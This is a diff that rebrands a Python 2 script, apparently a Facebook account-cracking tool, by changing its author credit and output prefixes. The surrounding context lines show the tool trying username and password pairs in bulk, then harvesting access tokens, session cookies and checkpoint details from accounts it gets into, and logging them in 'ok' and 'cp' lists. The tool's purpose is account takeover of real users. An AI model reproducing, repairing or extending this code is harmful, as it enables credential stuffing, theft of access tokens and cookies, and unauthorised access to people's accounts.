@@ -21,7 +21,7 @@ ingfo = (
  • Info script :
 
  	
- - author      : 
+ - author      : ☆ RAKA ☆ ™︻®╤───────═◍➤
 
  - facebook    : Raka Andrian Tara
 
@@ -679,7 +679,7 @@ class ngentod:
 
             if 'session_key' in response.text and 'EAAA' in response.text:
 
-                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
+                print '\r %s[RAKA_AMANDA] %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
 
                 ok.append('%s ◊ %s ◊ %s' % (user,pw,response.json()['access_token']))
 
@@ -701,7 +701,7 @@ class ngentod:
 
                     month = bulan1[month]
 
-                    print '\r %s*--> %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
+                    print '\r %s[RAKA_AMANDA] %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
 
                     cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
 
@@ -719,7 +719,7 @@ class ngentod:
 
                 except: pass
 
-                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
+                print '\r %s[RAKA_AMANDA] %s ◊ %s           ' % (K,user,pw)
 
                 cp.append('%s ◊ %s' % (user,pw))
 
@@ -733,7 +733,7 @@ class ngentod:
 
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
 
-        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
+        print('\r %sCRACK %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
 
         sys.stdout.flush()
 
@@ -797,7 +797,7 @@ class ngentod:
 
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-                print '\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
+                print '\r %s[RAKA_AMANDA] %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
 
                 ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
 
@@ -819,7 +819,7 @@ class ngentod:
 
                     month = bulan1[month]
 
-                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r %s[RAKA_AMANDA] %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
 
                     cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
 
@@ -837,7 +837,7 @@ class ngentod:
 
                 except: pass
 
-                print '\r %s*--> %s ◊ %s            ' % (K,user,pw)
+                print '\r %s[RAKA_AMANDA] %s ◊ %s            ' % (K,user,pw)
 
                 cp.append("%s ◊ %s"% (user,pw))
 
@@ -851,7 +851,7 @@ class ngentod:
 
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
 
-        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
+        print('\r %sCRACK %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
 
         sys.stdout.flush()
 
@@ -915,7 +915,7 @@ class ngentod:
 
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
+                print '\r %s[RAKA_AMANDA] %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
 
                 ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
 
@@ -937,7 +937,7 @@ class ngentod:
 
                     month = bulan1[month]
 
-                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r %s[RAKA_AMANDA] %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
 
                     cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
 
@@ -955,7 +955,7 @@ class ngentod:
 
                 except: pass
 
-                print '\r %s*--> %s ◊ %s              ' % (K,user,pw)
+                print '\r %s[RAKA_AMANDA] %s ◊ %s              ' % (K,user,pw)
 
                 cp.append("%s ◊ %s"% (user,pw))
 
@@ -969,7 +969,7 @@ class ngentod:
 
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
 
-        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
+        print('\r %sCRACK %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
 
         sys.stdout.flush()
 
@@ -991,7 +991,7 @@ def crack2(user, pwx):
 
 				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
 
-				print "\r "+rm+"*--> %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
+				print "\r "+rm+"CRACK %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
 
 				sys.stdout.flush()
 
@@ -1047,7 +1047,7 @@ def crack2(user, pwx):
 
 				# print ("\r",data)
 
-				# print ("\r *--> %s,%s,|,%s,%s            "%(P,user,H,pw))
+				# print ("\r [RAKA_AMANDA] %s,%s,|,%s,%s            "%(P,user,H,pw))
 
 				if "checkpoint_url" in str(data):
 
